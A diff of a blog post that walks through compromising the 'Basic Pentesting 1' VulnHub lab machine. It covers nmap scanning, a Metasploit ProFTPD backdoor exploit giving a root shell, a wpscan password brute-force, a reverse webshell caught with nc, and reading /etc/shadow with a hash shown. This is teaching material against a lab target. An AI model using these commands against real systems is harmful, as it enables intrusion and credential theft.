@@ -1,21 +1,24 @@
 ---
 layout: post
-title:  "Walkthrough Basic Pentesting"
+title:  "Walkthrough : Basic Pentesting"
 date:   2020-03-26 23:20:58 +0530
-tags: CTF update
+tags: [CTF, vulnhub]
 ---
 
+{% include toc %}
+
 In this walkthrough we are going to look at various steps of exploiting the end device. The `.ova` file can be downloaded from [www.vulnhub.com](https://www.vulnhub.com/entry/basic-pentesting-1,216/)
-## Scanning the network
+
+# Scanning the network
 One of the first steps is to scan the network for open ports and look for vulnerabilities. It can be done using tools/ utilities like `netdiscover` and `nmap`. We will see usage and outcome of both of these tools.
-### Using Netdiscover
+## Using Netdiscover
 `eth1` is the interface of the network on which you are listening to the incoming traffic. The interface can be checked by `ifconfig` command.
 
-{% highlight console %}
+```
 netdiscover -i eth1 -r 10.10.10.0/24
-{% endhighlight %}
+```
 
-{% highlight console %}
+```
 
  Currently scanning: Finished!   |   Screen View: Unique Hosts                       
                                                                                      
@@ -28,25 +31,25 @@ netdiscover -i eth1 -r 10.10.10.0/24
  10.10.10.104    08:00:27:c5:db:a3      1      60  PCS Systemtechnik GmbH            
  10.10.10.105    08:00:27:5b:29:29      1      60  PCS Systemtechnik GmbH            
 
-{% endhighlight %}
+```
 
 [comment]: <> ( // ![screenshot]({{ '/assets/img/posts/netdiscover.png' | relative_url }}) )
 
-### Using Nmap
+## Using Nmap
 
 We can also use `nmap` for target discovery. Since we have already made the target discovery using `netdiscover`, we can move
 forward to find open ports and the services running on those ports.
 
 The option
-{% highlight console %}
+```
 -A: Enable OS detection, version detection, script scanning, and traceroute
-{% endhighlight %}
+```
 
-{% highlight console %}
+```
 nmap -A 10.10.10.104
-{% endhighlight %}
+```
 
-{% highlight console %}
+```
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-31 13:46 EDT
 Nmap scan report for vtcsec (10.10.10.104)
 Host is up (0.00065s latency).
@@ -72,26 +75,26 @@ Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 TRACEROUTE
 HOP RTT     ADDRESS
 1   0.65 ms vtcsec (10.10.10.104)
-{% endhighlight %}
+```
 
 [comment]: <> ( ![screenshot]({{ '/assets/img/posts/nmap.png' | relative_url }}) )
 
-## Results of Scanning
+# Results of Scanning
 
 In our `nmap` scan results we have found three ports open with three different services running on these ports.
 We will try to exploit all these three services one by one to gain a foothold on the target device. Lets start with the easiest.
 
-##  Targeting FTP
+#  Targeting FTP
 
 From the scan results of `nmap` we have found that ftp version is `ProFTPD 1.3.3c`. We will now kickstart metasploit framework console to find, if we have some exploits for this version of FTP.
 
-{% highlight console %}
+```
 msfconsole
-{% endhighlight %}
+```
 
 Search the framework for any existing exploits.
 
-{% highlight console %}
+```
 msf5 > search ProFTPD 1.3.3c
 
 Matching Modules
@@ -106,11 +109,11 @@ Matching Modules
    5  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
    6  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution
 
-{% endhighlight %}
+```
 
 Now we have found an exploit with ranking of `excellent`. Lets try that out.
 
-{% highlight console %}
+```
 msf5 exploit(unix/ftp/proftpd_133c_backdoor) > exploit
 
 [*] Started reverse TCP double handler on 10.10.10.103:4444
@@ -131,9 +134,9 @@ pwd
 /
 whoami
 root
-{% endhighlight %}
+```
 
-## Targeting Website
+# Targeting Website
 
 As a first step we need to enumerate the directories of the website. For this we
 will use `DirBuster`. This tool is developed by OWASP Foundation to brute force
@@ -155,10 +158,10 @@ to resolve the links for the stylesheets. In order to overcome this challenge, w
 the domain name with the IPaddress. For this we will make an entry
 into the hosts file of our Kali PC.
 
-{% highlight console %}
+```
 nano /etc/hosts
 10.10.10.104  vtcsec
-{% endhighlight %}
+```
 
 The next step would be to scan for vulnerabilities in wordpress site. This can be done by using
 `wpscan`. It can be downloaded from [wpscan.org](https://wpscan.org/). This tool also comes pre-installed
@@ -170,7 +173,7 @@ and then try to bruteforce the passwords.
 
 Few of interesting options with `wpscan --enumerate` are
 
-{% highlight console %}
+```
 -e, --enumerate [OPTS]  Enumeration Process
                          Available Choices:
                           vp   Vulnerable plugins
@@ -182,18 +185,18 @@ Few of interesting options with `wpscan --enumerate` are
                                Range separator to use: '-'
                                Value if no argument supplied: 1-10
 
-{% endhighlight %}
+```
 
 Let us try to enumerate the users based on user ids.
 
-{% highlight console %}
+```
 wpscan --url http://10.10.10.104/secret --enumerate u --api-token SFQsH.....ayIm1ppfZZ8FH0
-{% endhighlight %}
+```
 
 `SFQsH.....ayIm1ppfZZ8FH0` is the `api-key` which you get after registering with
 [wpvulndb.com](https://wpvulndb.com/)
 
-{% highlight console %}
+```
  Brute Forcing Author IDs - Time: 00:00:00 <==> (10 / 10) 100.00% Time: 00:00:00
 
 [i] User(s) Identified:
@@ -201,23 +204,23 @@ wpscan --url http://10.10.10.104/secret --enumerate u --api-token SFQsH.....ayIm
 [+] admin
  | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
  | Confirmed By: Login Error Messages (Aggressive Detection)
-{% endhighlight %}
+```
 
 Once we have enumerated the users, we can bruteforce the password. We have downloaded
 the wordlist `rockyou-75.txt` from [SecLists](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-75.txt)
 
-{% highlight console %}
+```
 wpscan --url http://10.10.10.104/secret --enumerate u --api-token SFQsH.....ayIm1ppfZZ8FH0 --usernames 'admin' --passwords "/home/student/rockyou-75.txt"
-{% endhighlight %}
+```
 
-{% highlight console %}
+```
 [+] Performing password attack on Wp Login against 1 user/s
 Trying admin / admin Time: 00:03:36 <======================================================> (19815 / 19815) 100.00% Time: 00:03:36
 [SUCCESS] - admin / admin                                                                                                          
 
 [i] Valid Combinations Found:
  | Username: admin, Password: admin
-{% endhighlight %}
+```
 
 With *username* and *password* under our kitty, we can use them to upload the `webshells`. There is a lot of material
 avilable to create a webshell in php. You can refer [www.acunetix.com](https://www.acunetix.com/websitesecurity/introduction-web-shells/) for a simple webshell and for using `Weevely`, which is a lightweight PHP telnet-like web-shell. 
@@ -234,23 +237,23 @@ reverse TCP connection.
 Once we upload the shell, which can be done with one of the ways mentioned in [www.hackingarticles.in](https://www.hackingarticles.in/wordpress-reverse-shell/), we get the `www-data` access. In order, for the webshell to connect back
 to the Kali attacker machine, we can run `nc`.
 
-{% highlight console %}
+```
 root@kali:~# nc -lvp 1234
 Listening on 0.0.0.0 1234
-{% endhighlight %}
+```
 
 We can also check the status of ports on which the `nc` is running 
 
-{% highlight console %}
+```
 root@kali:~# netstat -plntu
 Active Internet connections (only servers)
 Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
 tcp        0      0 0.0.0.0:1234            0.0.0.0:*               LISTEN      18166/nc            
-{% endhighlight %}
+```
 
 Once, the *webshell* makes a reverse TCP connection we get 
 
-{% highlight console %}
+```
 root@kali:~# nc -lvp 1234
 Listening on 0.0.0.0 1234
 Connection received on vtcsec 37790
@@ -263,12 +266,12 @@ $ whoami
 www-data
 $ cat /etc/shadow
 marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
-{% endhighlight %}
+```
 
 In order to find *users* in the linux system you can refer this article [linuxize.com](https://linuxize.com/post/how-to-list-users-in-linux/)
 
 The password can be obtained by cracking the hashes using `John the Ripper` or `hashcat`. 
-{% highlight console %}
+```
 1800 | sha512crypt $6$, SHA512 (Unix)                   | Operating Systems
-{% endhighlight %}
+```
 
